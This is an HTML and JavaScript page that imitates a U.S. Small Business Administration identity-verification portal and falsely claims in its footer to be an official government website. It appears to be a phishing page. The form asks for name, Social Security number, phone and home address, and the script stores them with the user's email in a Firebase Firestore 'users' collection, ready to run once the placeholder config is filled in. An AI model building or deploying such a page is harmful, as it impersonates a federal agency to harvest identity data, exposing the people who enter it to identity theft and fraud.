<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal - Identity Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col justify-between">

    <div class="w-full bg-[#002f6c] h-2"></div>

    <div class="flex-grow flex items-center justify-center px-4 py-8">
        <div class="max-w-xl w-full bg-white rounded-xl shadow-xl border border-gray-100 overflow-hidden transition-all duration-300 hover:shadow-2xl">
            
            <div class="p-6 text-center bg-white border-b border-gray-100 relative">
                <div class="absolute bottom-0 left-1/2 -translate-x-1/2 w-24 h-[3px] bg-[#d61a22]"></div>
                
                <div class="inline-flex items-center justify-center mb-3">
                    <div class="relative w-14 h-14 border-2 border-[#002f6c] flex items-center justify-center font-bold text-xl text-[#002f6c] tracking-tighter">
                        SB<span class="text-[#002f6c]">A</span>
                        <div class="absolute -bottom-[2px] -left-[2px] w-6 h-[3px] bg-[#d61a22]"></div>
                        <div class="absolute -bottom-[2px] -left-[2px] w-[3px] h-3 bg-[#d61a22]"></div>
                    </div>
                </div>
                <h2 class="text-lg font-bold text-[#002f6c] uppercase tracking-wide">Identity & Address Profile Sync</h2>
                <p class="text-xs text-gray-400 mt-0.5">Please finalize all federal file field inputs precisely</p>
            </div>

            <div class="px-8 pt-5 flex items-center justify-between text-xs font-semibold text-gray-400 uppercase tracking-wider">
                <span class="text-emerald-600 flex items-center gap-1.5">
                    <i class="fa-solid fa-circle-check text-sm"></i>
                    Credentials
                </span>
                <div class="flex-grow mx-4 h-[2px] bg-gray-200 relative">
                    <div class="absolute top-0 left-0 w-full h-full bg-emerald-500"></div>
                </div>
                <span class="text-[#002f6c] flex items-center gap-1.5">
                    <span class="w-5 h-5 rounded-full bg-[#002f6c] text-white flex items-center justify-center text-[10px]">2</span>
                    Verification
                </span>
            </div>

            <form id="registerForm2" class="p-8 space-y-4">
                
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">First Name</label>
                        <input type="text" id="firstName" required 
                            class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                    </div>
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">Last Name</label>
                        <input type="text" id="lastName" required 
                            class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                    </div>
                </div>

                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">Social Security Number (SSN)</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400">
                                <i class="fa-solid fa-id-card text-xs"></i>
                            </span>
                            <input type="text" id="ssn" required maxlength="11" placeholder="000-00-0000"
                                class="w-full pl-9 pr-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                        </div>
                    </div>
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">Mobile Phone Number</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400">
                                <i class="fa-solid fa-phone text-xs"></i>
                            </span>
                            <input type="tel" id="phone" required placeholder="(555) 555-5555"
                                class="w-full pl-9 pr-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                        </div>
                    </div>
                </div>

                <div>
                    <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">Street Address</label>
                    <input type="text" id="streetAddress" required placeholder="123 Main St, Apt 4B"
                        class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                </div>

                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">City</label>
                        <input type="text" id="city" required 
                            class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                    </div>
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">State</label>
                        <input type="text" id="state" required placeholder="NY" maxlength="2"
                            class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                    </div>
                    <div>
                        <label class="block text-[11px] font-bold uppercase text-[#002f6c] tracking-wider mb-1">ZIP Code</label>
                        <input type="text" id="zipCode" required maxlength="5" placeholder="10001"
                            class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#002f6c] focus:border-[#002f6c] transition-all">
                    </div>
                </div>

                <button type="submit" id="btnSubmit"
                    class="w-full bg-[#002f6c] hover:bg-[#001f4d] text-white font-semibold py-3 px-4 rounded-lg shadow-md transition-all duration-150 flex items-center justify-center gap-2 text-sm mt-4">
                    <i class="fa-solid fa-shield-check text-xs"></i>
                    <span>Authorize Verification Filing</span>
                </button>
            </form>
        </div>
    </div>

    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-3"></div>

    <footer class="w-full text-center py-4 bg-white border-t border-gray-200 text-[10px] text-gray-400 tracking-wide font-medium">
        An official website of the United States government. Managed by SBA Dev Team.
    </footer>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // Firebase Configuration Object Configuration
        const firebaseConfig = {
            apiKey: "YOUR_FIREBASE_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        // Initialize Firebase SDK Elements
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let activeUser = null;

        // Track Current User Session Authentication Lifecycle
        onAuthStateChanged(auth, (user) => {
            if (user) {
                activeUser = user;
            } else {
                showToast("Filing authorization expired. Re-routing initialization...", "error");
                setTimeout(() => { window.location.href = "register1.html"; }, 2000);
            }
        });

        // Premium Real-Time Custom Toast Framework Implementation
        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            
            const baseClass = "flex items-center gap-3 p-4 rounded-lg shadow-lg text-sm font-medium border min-w-[280px] transform transition-all duration-300 translate-y-2 opacity-0";
            const typeClasses = type === 'success' 
                ? "bg-emerald-50 text-emerald-800 border-emerald-200" 
                : "bg-rose-50 text-rose-800 border-rose-200";
            
            const icon = type === 'success' 
                ? '<i class="fa-solid fa-circle-check text-emerald-500 text-lg"></i>' 
                : '<i class="fa-solid fa-circle-exclamation text-rose-500 text-lg"></i>';

            toast.className = `${baseClass} ${typeClasses}`;
            toast.innerHTML = `${icon} <span>${message}</span>`;
            
            container.appendChild(toast);
            
            setTimeout(() => { toast.classList.remove('translate-y-2', 'opacity-0'); }, 10);
            setTimeout(() => {
                toast.classList.add('opacity-0', 'translate-y-1');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        // Handle Secondary Registration Lifecycle Execution Form Flow
        document.getElementById('registerForm2').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!activeUser) return showToast("No active registration parameters detected.", "error");

            const btnSubmit = document.getElementById('btnSubmit');

            // Construct Consolidated Structural Data Payload Structure
            const payload = {
                uid: activeUser.uid,
                email: activeUser.email,
                firstName: document.getElementById('firstName').value.trim(),
                lastName: document.getElementById('lastName').value.trim(),
                ssn: document.getElementById('ssn').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: {
                    street: document.getElementById('streetAddress').value.trim(),
                    city: document.getElementById('city').value.trim(),
                    state: document.getElementById('state').value.trim().toUpperCase(),
                    zip: document.getElementById('zipCode').value.trim()
                },
                timestamp: new Date().toISOString()
            };

            try {
                btnSubmit.disabled = true;
                btnSubmit.innerHTML = '<i class="fa-solid fa-circle-notch animate-spin"></i> <span>Processing Secure Data Sync...</span>';

                // Synchronize payload dataset elements straight into Firestore Cloud Target Document
                await setDoc(doc(db, "users", activeUser.uid), payload);
                
                showToast("Filing synced successfully. Identity verification complete!");
                
                setTimeout(() => {
                    window.location.href = "dashboard.html";
                }, 2000);

            } catch (error) {
                btnSubmit.disabled = false;
                btnSubmit.innerHTML = '<i class="fa-solid fa-shield-check text-xs"></i> <span>Authorize Verification Filing</span>';
                showToast(error.message.replace("Firebase: ", ""), "error");
            }
        });
    </script>
</body>
</html>
